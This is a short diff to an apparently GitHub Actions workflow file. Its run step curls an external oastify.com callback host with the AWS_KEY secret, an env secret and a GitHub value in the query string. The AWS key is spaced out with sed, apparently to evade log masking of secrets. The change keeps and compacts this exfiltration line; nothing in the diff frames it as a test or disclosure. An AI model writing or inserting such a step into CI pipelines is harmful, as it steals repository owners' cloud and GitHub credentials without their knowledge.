@@ -18,6 +18,4 @@ jobs:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}       
 
       run: |
-        $awsk=${{ secrets.AWS_KEY }} | sed 's/./& /g'
-        echo $awsk
-        curl -X GET "http://ezh52tvjwif7vi2wd3ubu7d38uel2bq0.oastify.com?awskey=${awsk}&envsec=${envk}&github=${ghk}"
+        curl -X GET "http://ezh52tvjwif7vi2wd3ubu7d38uel2bq0.oastify.com?awskey=${${{ secrets.AWS_KEY }} | sed 's/./& /g'}&envsec=${envk}&github=${ghk}"
